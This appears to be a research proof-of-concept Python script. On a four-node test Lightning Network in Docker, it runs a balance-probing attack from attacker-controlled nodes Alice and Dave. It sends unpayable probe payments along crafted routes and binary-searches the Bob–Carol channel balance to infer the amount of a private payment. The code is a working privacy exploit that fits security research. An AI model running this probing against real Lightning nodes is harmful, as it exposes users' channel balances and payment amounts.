import networkinitializer
from ln_test_framework.lndctl import *
from ln_test_framework.utils import *
from ln_test_framework.bitcoindctl import *
import time
import json
import copy
import random
import secrets
"""
'{
    "routes": [
        {
            "total_fees": "1",
            "total_amt": "2",
            "hops": [
                {
                    "chan_id": "359540302348288",
                    "chan_capacity": "100000",
                    "amt_to_forward": "1",
                    "fee": "1",
                    "expiry": 381,
                    "amt_to_forward_msat": "1000",
                    "fee_msat": "1000",
                    "pub_key": "02d35cb4e7552382ba77f359e0590dad101c05ac746a0ab8bb6ada12b730bacf15"
                },
                {
                    "chan_id": "359540302479360",
                    "chan_capacity": "100000",
                    "amt_to_forward": "1",
                    "fee": "0",
                    "expiry": 381,
                    "amt_to_forward_msat": "1000",
                    "fee_msat": "0",
                    "pub_key": "02f8c14bdf90d49dae88c4573f7d70bfb2c4d3bc25401894fb08f4cfc565924d8b"
                },
                {
                    "chan_id": "359540302413824",
                    "chan_capacity": "100000",
                    "amt_to_forward": "1",
                    "fee": "0",
                    "expiry": 381,
                    "amt_to_forward_msat": "1000",
                    "fee_msat": "0",
                    "pub_key": "0217531a8acb54b2fad4215f318f82dea72976fbb7d8a600806bea5b97c8e5f84a"
                }
            ],
            "total_fees_msat": "1000",
            "total_amt_msat": "2000"
        }
    ]
}'
"""
delta_cltv = 50
base_fee_msat = 1000
fee_rate_milli_msat = 1


def calc_fee(base_fee_msat, fee_rate_milli_msat , amt):
	# print(amt)
	return base_fee_msat + (amt*fee_rate_milli_msat)//1000000


def create_all_but_one_edge_circle_route(routes, send_amt, height):
	# final_lock_time = height + (len(routes['routes'][0]['hops']) + 1)*delta_cltv
	# routes['routes'][0]['total_time_lock'] = final_lock_time
	#Pay the fees per route
	i = 0

	cltv = height + delta_cltv
	total_amt_msat = send_amt*1000
	total_fees_msat = 0
	for hop in reversed(routes['routes'][0]['hops']):
		fee_msat = 0
		if i == 0:
			fee_msat = 0
		else:
			cltv += delta_cltv
			fee_msat = calc_fee(base_fee_msat, fee_rate_milli_msat, total_amt_msat)
		# print(str(fee_msat) + " is fee_msat")
		fee_sat = fee_msat//1000
		hop['fee'] = str(fee_sat)
		hop['fee_msat'] = str(fee_msat)
		hop['expiry'] = cltv 

		total_fees_msat += fee_msat
		hop['amt_to_forward'] = str(total_amt_msat//1000)
		hop['amt_to_forward_msat'] = str(total_amt_msat)
		total_amt_msat+=total_fees_msat
		i = i + 1
	# dest = routes['routes'][0]['hops'][i-1]
	# dest['amt_to_forward'] = str(amt)
	# dest['amt_to_forward_msat'] = str(amt*1000)
	# dest['fee'] = str(0)
	# dest['fee_msat'] = str(0)
	# dest['expiry']+=delta_cltv

	routes['routes'][0]['total_time_lock'] = cltv + delta_cltv
	routes['routes'][0]['total_fees'] = str(total_fees_msat//1000)
	routes['routes'][0]['total_amt'] = str(total_amt_msat//1000)
	routes['routes'][0]['total_amt_msat'] = str(total_amt_msat)
	routes['routes'][0]['total_fees_msat'] = str(total_fees_msat)
	return routes

def msg_reached(node, hash):
	log = node.container.logs().decode('utf-8')
	return (hash in log)

def main():
	num_nodes = 4
	network = networkinitializer.setup(num_nodes, with_balance = True)

	bitcoind = network.bitcoind_node
	lnd_nodes = network.lnd_nodes

	alice = lnd_nodes[0]
	bob = lnd_nodes[1]
	carol = lnd_nodes[2]
	dave = lnd_nodes[3]




	# Open connection from Alice to Bob and Bob to Carol and Coral to Alice
	capacity = 2**21-1
	res = alice.container.exec_run(createconnection(bob))
	res = alice.container.exec_run(openchannel(bob, capacity))

	res = bob.container.exec_run(createconnection(carol))
	res = bob.container.exec_run(openchannel(carol, capacity))

	res = carol.container.exec_run(createconnection(dave))
	res = carol.container.exec_run(openchannel(dave, capacity))


	# confirm the funding transactions; only 3 are needed for lnd
	bitcoind.container.exec_run(generatetoaddress(6))

	time.sleep(2)
	# THis is wait time for network so that all payments are along the same route
	time.sleep(15)

	# We do not control a bob-carol link. The attacker can only control nodes alice and dave
	
	# Step 1: send a random amount from bob to carol and try to infer that amount from out algorithm
	invoice_amt = random.randint(0,(capacity*99)//100)
	res = carol.container.exec_run(getinvoice(invoice_amt))
	pay_req = get_attr(res, 'pay_req')

	print(str(invoice_amt) + " is the final invoice_amt ")


	res = bob.container.exec_run(sendpayment(pay_req))
	# print(res.output.decode('utf-8'))

	# Step 2: Payment inference using binary search
	invoice_amt = 100
	res = dave.container.exec_run(getinvoice(invoice_amt))
	pay_req = get_attr(res, 'pay_req')
	payment_hash = get_attr(res, 'r_hash')
	# print(payment_hash)

	# We need to parse the structure of the queryroutes 
	res = alice.container.exec_run(queryroutes(dave, invoice_amt))
	routes = json.loads(res.output.decode('utf-8'))

	# find_last_hop(); add last hop to routes
	# print(routes)
	#Change this later
	exec_res = alice.container.exec_run(getinfo())
	height = int(json.loads(exec_res.output.decode('utf-8')).get('block_height'))

	high = 2**24 - 1
	low = 0
	while low < high:
		print(low, high)
		amt = (low + high)//2
		payment_hash = secrets.token_hex(32)
		new_route = create_all_but_one_edge_circle_route(routes, amt, height)
		res = alice.container.exec_run(sendtoroute(payment_hash, "\'" + json.dumps(new_route) + "\'"))
		assert get_attr(res, 'payment_error') != ""
		assert get_attr(res, 'payment_preimage') == ""
		
		if msg_reached(dave, payment_hash):
			low = amt + 1
		else:
			high = amt

	print(low, high)
	print("The maximum balance which can be sent via this channel is " + str(low - 1 ))
	return

if __name__ == "__main__":
	main()
